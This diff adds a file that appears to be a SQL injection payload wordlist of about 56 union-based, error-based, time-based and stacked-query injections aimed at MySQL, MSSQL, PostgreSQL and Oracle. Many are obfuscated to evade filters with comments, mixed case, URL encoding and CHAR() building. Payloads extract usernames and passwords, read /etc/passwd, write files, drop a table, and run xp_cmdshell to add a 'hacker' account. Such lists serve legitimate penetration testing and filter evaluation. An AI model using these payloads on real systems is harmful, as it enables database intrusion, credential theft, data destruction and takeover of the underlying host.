@@ -1,0 +1,56 @@
+' UNION SELECT user(); -- -
+'or 'elscustom'='elsFALSE
+'or 'elscustom'='elscustom
+'/**/UNION/**/SELECT/**/@@version;#
+'UNION(select('PoC String'));#
+'union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
+'union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='secretcustomers'));#
+"UNION(select('PoC String'));#
+"union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
+' UNiOn seLect @@versiOn;#
+'uZEROFILLnZEROFILLiZEROFILLoZEROFILLnZEROFILL ZEROFILLsZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt ZEROFILL@@ZEROFILLvZEROFILLeZEROFILLrZEROFILLsZEROFILLiZEROFILLoZEROFILLnZEROFILL; ZEROFILL-- ZEROFILL-ZEROFILL
+%61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d
+%25%36%31%25%36%31%25%36%31%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%40%25%34%40%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%33%62%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64
+') uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt 'PoC'; -- -
+'UNION(select(1));#
+'UNION(select(concat(user(),0x3a,database())));#
+'UNION(SELECT(group_concat(table_name))FROM(information_schema.tables)WHERE(table_schema=database()));#
+'UNION(SELECT(table_name,column_name)FROM(information_schema.columns)WHERE(table_schema=database())LIMIT(1,1));#
+'UNION(select(concat(username,0x3a,password))from(users));#
+'UNION(select(load_file('/etc/passwd')));#
+'uNiOn(SeLeCt(1));#
+'UNION((SELECT(1)));#
+'UNION(SELECT((1,2,3)));#
+'AND(extractvalue(1,concat(0x3a,(select(@@version)))));#
+'AND(updatxml(1,concat(0x3a,(select(database()))),1));#
+'AND(1=2 UNION SELECT(1,2,3));#
+';DECLARE @a varchar(99);SET @a='';EXEC(@a+CHAR(79)+CHAR(82)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(49));#
+';BEGIN WAITFOR DELAY '00:00:05' END;#
+';SELECT pg_sleep(5);#
+'||CHR(39)||CHR(85)||CHR(78)||CHR(73)||CHR(79)||CHR(78)||CHR(40)||CHR(49)||CHR(41)||CHR(59)||CHR(35)||
+'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'#
+'||(SELECT table_name FROM all_tables WHERE ROWNUM=1)||'#
+';SELECT SLEEP(5);#
+'AND 1=(SELECT COUNT(*)FROM information_schema.tables);#
+'AND EXISTS(SELECT * FROM information_schema.tables);#
+'AND(ASCII(SUBSTRING((SELECT database()),1,1))>64);#
+'AND(LENGTH((SELECT table_name FROM information_schema.tables LIMIT 0,1))=5);#
+'(SELECT(SUBSTRING((SELECT database()),1,1)))#
+'UNION(SELECT(concat_ws(0x3a,user(),database(),version())));#
+'UNION(SELECT(table_name)FROM(information_schema.tables)WHERE(table_schema=database())LIMIT(0,1));#
+'AND(extractvalue(1,concat(0x3a,(SELECT group_concat(table_name)FROM information_schema.tables)));#
+';SELECT benchmark(5000000,md5(1));#
+'|| (SELECT extractvalue(1,concat(0x3a,(SELECT @@version))) ||'#
+'UNION ALL SELECT NULL,concat(username,0x3a,password)FROM users;#
+'UNION SELECT NULL,@@version,table_name,NULL FROM information_schema.tables;#
+'; DROP TABLE temp; SELECT * FROM (SELECT SLEEP(5))x;#
+'OR 1=1--(nested
+' OR "1"="1
+' OR 1=CAST((SELECT @@version)AS int)
+';SELECT * FROM users WHERE id='1' UNION SELECT * FROM users;#
+'UNION SELECT 1,2,3 INTO OUTFILE 'c:/test.txt';#
+'SELECT * FROM (SELECT * FROM users WHERE 1=0 UNION SELECT * FROM admin) x;#
+'UNION SELECT LOAD_FILE('/etc/passwd'),2,3;#
+';EXEC xp_cmdshell('net user hacker pass /add');#
+'SELECT * FROM users WHERE id=1 AND 1=0 UNION ALL SELECT * FROM sensitive_data;#
+'UNION ALL SELECT NULL,(SELECT password FROM users LIMIT 1),NULL,NULL;#
